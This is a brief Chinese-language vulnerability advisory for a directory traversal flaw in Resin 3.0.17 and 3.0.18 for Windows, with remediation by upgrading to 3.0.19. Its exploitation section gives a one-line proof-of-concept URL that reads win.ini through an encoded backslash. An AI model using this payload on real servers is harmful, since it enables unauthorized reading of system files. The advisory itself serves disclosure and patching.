### 一 漏洞描述
Resin是一款由Caucho Technology开发的WEB服务器,可使用在Microsoft Windows操作系统下。

Resin捆绑了自己的单机版Web服务器,默认下运行在8080端口上,其对用户请求的处理上存在漏洞,远程攻击者可以利用此漏洞遍历服务器的目录。

### 二 漏洞利用
http://host:port/C:%5c/windows/win.ini

### 三 漏洞修复
受影响系统:

Caucho Technology Resin v3.0.18 for Windows

Caucho Technology Resin v3.0.17 for Windows

不受影响系统:

Caucho Technology Resin v3.0.19

升级Resin版本至3.0.19及以上
